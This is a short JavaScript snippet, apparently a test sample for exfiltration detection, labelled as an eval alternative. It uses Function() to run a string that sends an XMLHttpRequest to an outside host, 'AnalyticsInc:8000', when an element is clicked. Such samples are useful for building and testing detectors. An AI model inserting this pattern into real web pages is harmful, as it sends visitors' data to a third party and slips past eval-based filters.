
// addEventListener - Eval Alternative - No Obfuscation
// Exfiltrate data using XMLHTTP request
var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onclick2", true);xmlhttp.send(null);';
document.getElementById('test').addEventListener("click", Function(exp), false);
